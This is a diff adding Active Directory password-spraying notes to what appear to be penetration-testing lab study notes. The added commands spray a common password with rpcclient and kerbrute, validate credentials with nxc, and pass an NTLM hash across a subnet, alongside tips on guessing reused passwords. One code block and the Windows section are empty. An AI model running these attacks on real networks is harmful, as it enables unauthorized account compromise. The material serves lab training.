@@ -363,6 +363,49 @@ nxc smb 172.16.5.5 -u htb-student -p "Academy_student_AD\!" --users
 
 ----------------
 
--  
+-   Rpcclient is an excellent option for performing this attack from Linux. An important consideration is that a valid login is not immediately apparent with rpcclient, with the response Authority Name indicating a successful login. We can filter out invalid login attempts by grepping for Authority in the response. The following Bash one-liner (adapted from here) can be used to perform the attack.
+
+```bash
+for u in $(cat valid_ad_users);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+```
+
+<img width="1420" height="684" alt="image" src="https://github.com/user-attachments/assets/c3a56b02-aeb7-4936-aecd-cb7e7320c4dd" />
+
+- Kerbrute too-:
+
+```bash
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+```
+
+<img width="1064" height="389" alt="image" src="https://github.com/user-attachments/assets/23b483a6-1fc3-429d-88f8-fcd774498b42" />
+
+- Using nxc-:
+
+```bash
+```
+
+- Validating with nxc-:
+
+```bash
+nxc smb 172.16.5.5 -u avazquez -p Password123
+```
+
+<img width="1897" height="571" alt="image" src="https://github.com/user-attachments/assets/2dbdef7c-593b-431f-bafb-cf45f1a2db9d" />
+
+- When working with local administrator accounts, one consideration is password re-use or common password formats across accounts. If we find a desktop host with the local administrator account password set to something unique such as $desktop%@admin123, it might be worth attempting $server%@admin123 against servers. Also, if we find non-standard local administrator accounts such as bsmith, we may find that the password is reused for a similarly named domain user account. The same principle may apply to domain accounts. If we retrieve the password for a user named ajones, it is worth trying the same password on their admin account (if the user has one), for example, ajones_adm, to see if they are reusing their passwords. This is also common in domain trust situations. We may obtain valid credentials for a user in domain A that are valid for a user with the same or similar username in domain B or vice-versa.
+- Password spraying hash gotten from a SAM database with `nxc`. The `--local-auth` flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout. Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain.
+
+```bash
+nxc smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+```
+
 
 ----------------
+
+### With Windows
+
+-----------------
+
+-
+
+-----------------
